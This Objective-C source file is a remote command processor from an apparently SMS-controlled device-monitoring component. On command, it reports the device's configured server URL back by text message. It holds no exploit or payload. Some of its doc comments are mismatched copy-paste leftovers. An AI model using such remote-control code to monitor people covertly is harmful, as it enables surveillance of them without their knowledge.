/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestCurrentURLProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RequestCurrentURLProcessor.h"

@interface RequestCurrentURLProcessor (PrivateAPI)
- (void) sendReplySMSWithResult:(NSString *) aResult;
- (void) requestCurrentURL;
@end

@implementation RequestCurrentURLProcessor

/**
 - Method name: initWithRemoteCommandData:
 - Purpose:This method is used to initialize the RequestCurrentURLProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RequestCurrentURLProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"RequestCurrentURLProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestCurrentURLProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestCurrentURLProcessor--->doProcessingCommand")
	[self requestCurrentURL];
}


#pragma mark AddURLProcessor Private Methods

/**
 - Method name: processRestartDevice
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) requestCurrentURL {
	DLog (@"RequestCurrentURLProcessor--->requestCurrentURL")
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	NSString *result=NSLocalizedString(@"kRequestCurrentURL", @"");
	if ([serverManager getStructuredServerUrl]) 
		result=[result stringByAppendingString:[serverManager getStructuredServerUrl]];
	   [self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestCurrentURLProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestCurrentURLMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:requestCurrentURLMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestCurrentURLMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */


-(void) dealloc {
	[super dealloc];
}

@end
